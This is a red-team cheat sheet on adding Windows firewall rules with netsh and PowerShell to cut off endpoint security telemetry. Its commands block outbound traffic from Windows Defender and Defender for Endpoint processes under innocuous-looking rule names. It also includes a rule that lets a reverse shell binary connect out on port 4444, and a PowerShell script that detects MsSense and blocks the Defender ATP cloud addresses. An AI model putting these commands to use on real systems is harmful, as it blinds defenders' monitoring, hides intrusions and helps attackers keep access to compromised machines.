# Add Firewall Rule

## 01 - Usage

### 1.1 - Command Prompt

> [!NOTE] Elevated Privileges is required
> Using `netsh.exe` requires administrative rights when adding firewall rules.

You can remotely add a firewall rule communicating through NETBIOS.

```
C:\> netsh.exe [-r <IP>] advfirewall firewall add rule name="<rule_name>" dir=<in | out> action=<allow | block | bypass> protocol=<any | tcp | udp | icmpv4 | icmpv6> localport=<PORT>
```

### 1.2 - PowerShell

```
PS C:\> New-NetFirewallRule -DisplayName "<rule_name>" -Direction <Inbound | Outbound> -LocalPort <PORT> -Action <NotConfigured | Allow | Block> -Protocol <TCP | UDP | ICMPV4 | ICMPV6>
```

## 02 - Scenarios

### 2.1 - Block Outbound Packets

#### 2.1.1 - Command Prompt

Limit certain UDP outbound packets for NETBIOS fingerprinting

```
C:\> netsh.exe advfirewall firewall add rule name="Load Balancer" protocol=udp dir=out localport=137 action=block
```

Limit certain UDP outbound packets for DNS lookup fingerprinting

```
C:\> netsh.exe advfirewall firewall add rule name="Endpoint Response Agent" protocol=udp dir=out localport=53 action=block
```

#### 2.1.2 - PowerShell

Limit certain UDP outbound packets for NETBIOS fingerprinting

```
PS C:\> New-NetFirewallRule -DisplayName "Load Balancer" -Direction Outbound -LocalPort 137 -Action Block -Protocol UDP
```

Limit certain UDP outbound packets for DNS lookup fingerprinting

```
PS C:\> New-NetFirewallRule -DisplayName "Endpoint Response Agent" -Direction Outbound -LocalPort 53 -Action Block -Protocol UDP
```

### 2.2 - Block Security Endpoints

#### 2.2.1 - Windows Defender

Command Prompt

```
C:\> netsh.exe advfirewall firewall add rule name="Block 443 MsMpEng" dir=outbound protocol=TCP action=block service=WinDefend remoteport=443

C:\> netsh.exe advfirewall firewall show rule name="Block 443 MsMpEng"
```

PowerShell

```powershell
PS C:\> New-NetFirewallRule -DisplayName "Block 443 MsMpEng" -Name "Block 443 MsMpEng" -Direction Outbound -Service WinDefend -Enabled True -RemotePort 443 -Protocol TCP -Action Block

PS C:\> Get-NetFirewallRule -DisplayName "Block 443 MsMpEng"
```

#### 2.2.2 - Advanced Threat Protection

- Command Prompt

```
C:\> netsh.exe advfirewall firewall add rule name="Block 443 SenseCncProxy" dir=outbound program="%ProgramFiles%\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" remoteport=443 protocol=TCP action=block

C:\> netsh.exe advfirewall firewall add rule name="Block 443 MsSense" dir=outbound program="%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe" remoteport=443 protocol=TCP action=block
```

- PowerShell

```
PS C:\> New-NetFirewallRule -DisplayName "Block 443 SenseCncProxy" -Name "Block 443 SenseCncProxy" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" -RemotePort 443 -Protocol TCP -Action Block

PS C:\> New-NetFirewallRule -DisplayName "Block 443 MsSense" -Name "Block 443 MsSense" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe" -RemotePort 443 -Protocol TCP -Action Block
```

#### 2.2.3 - Third Party

TODO: Provide other examples from different endpoints

### 2.3 - Allow programs with incoming/outgoing connection

TODO: Provide examples such as in a restricted network by adding a firewall rule to establish a callback shell connection

#### 2.3.1 - Callback Reverse Shell

TODO: Test this

- Command Prompt

```
C:\> netsh.exe advfirewall firewall add rule name="Callback Reverse Shell" profile=domain,private,public remoteport=4444 protocol=tcp enable=yes dir=out program="C:\path\to\shell.exe" action=allow
```

- PowerShell

```
PS C:\> New-NetFirewallRule -Name "Callback Reverse Shell" -Profile "Domain,Private,Public" -Protocol TCP -Enabled True -Direction Outbound -RemotePort 4444 -Program "C:\path\to\shell.exe" -Action Allow
```

#### 2.3.2 - Callback Bind Shell

## 03 - Automated Script

```powershell
# Define Cloud Security Vendor Address
# Windows Defender ATP

$MSATP1 = "securitycenter.windows.com"
$MSATP2 = "winatp-gw-cus.microsoft.com"
$MSATP3 = "winatp-gw-eus.microsoft.com"
$MSATP4 = "winatp-gw-weu.microsoft.com"
$MSATP5 = "winatp-gw-neu.microsoft.com"
$MSATP6 = "us.vortex-win.data.microsoft.com"
$MSATP7 = "eu.vortex-win.data.microsoft.com"
$MSATP8 = "psapp.microsoft.com"
$MSATP9 = "psappeu.microsoft.com"
$MSATPURLs = $MSATP1,$MSATP2,$MSATP3,$MSATP4,$MSATP5,$MSATP6,$MSATP7,$MSATP8,$MSATP9

# Checking for Behavioural Analysis AV security product processes and adding outbound FW blocks
Write-Output ("[*] Checking for Behavioural Analytics AV security product processes and adding outbound firewall block rules" + "`n")
[CmdletBinding()]
$processnames = Get-Process | Select-Object ProcessName
Foreach ($ps in $processnames) {
    if ($ps.ProcessName -like "*MsSense*") {
        Write-Output ("[*] Defender ATP process " + $ps.ProcessName + " is running." + " Resolving ATP FQDN IP's and blocking outbound connections.")
        $MSATPCouldIPs = $MSATPURLs | foreach {[System.Net.Dns]::GetHostAddresses($_)} | Select-Object -ExpandProperty IPAddressToString
        Foreach-Object {
            New-NetFirewallRule -DisplayName "Windows Advertising Broker" -Direction Outbound -Action Block -RemoteAddress "$_" -Profile Any
            Write-Host "$_ - Outbound Firewall Block Was Added: $?"
        }
    }
}

```

---
## References

- [RedTeamRecipe: Registry Attack Vectors](https://blog.redteamguides.com/registry-attack-vectorsrtc0018)

- [Silencing Microsoft Defender for Endpoint using firewall rules](https://medium.com/csis-techblog/silencing-microsoft-defender-for-endpoint-using-firewall-rules-3839a8bf8d18)

- [Detect Addition of New Firewall Rules in Defender Firewall](https://bhabeshraj.com/post/detect-addition-of-new-firewall-rules-in-defender-firewall/)

- [Ivan's IT learning blog: Installing Reverse Shell Backdoors on Windows Systems](https://ivanitlearning.wordpress.com/2019/06/09/installing-reverse-shell-backdoors-on-windows-systems/)

- [Blackhat: Red Team Techniques for Evading, Bypassing, and Disabling MS Advanced Threat Protection and Advanced Threat Analytics](https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf)